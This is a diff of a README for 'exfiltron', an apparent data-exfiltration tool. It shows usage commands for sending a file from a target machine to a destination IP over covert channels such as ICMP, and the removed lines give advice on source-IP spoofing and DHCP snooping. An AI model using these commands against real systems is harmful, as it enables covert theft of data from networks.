@@ -20,15 +20,16 @@ file (exfiltron.py) and the server file. The client file must be placed on
 a target machine along with any modules you wish to use for your extraction
 method. SET UP THE SERVER SIDE INFORMATION HERE. After exfiltron.py has
 been placed on the target machine, run the following command:
-`python exfiltron.py exfiltrationMethod -filename -IPaddressThatIsRecieving
-TheData [-h] [-s] [-a]`
--h is help. -s is an option to change the source IP address on the
-packets you send out. It should be noted that this is risky. The target
-network should not be running any DHCP snooping software if you use this option.
--a is the amount of data you want to fit into each packet. The default is the
-number of bits that normally sit in that packet while the min amount is 1 bit
+
+`python exfiltron.py exfiltrationMethod -f filename -d destinationIP [-h] 
+[-a]`
+
+* -h is help
+* -a is the amount of data you want to fit into each packet. The default is the
+number of bytes that normally sit in that packet while the min amount is 1 byte
 and the max amount is the MTU minus the size of the packet.
 
+## Methods of Exfiltration
 Currently, the following methods of exfiltration are available/in progress:
 * ICMP
 
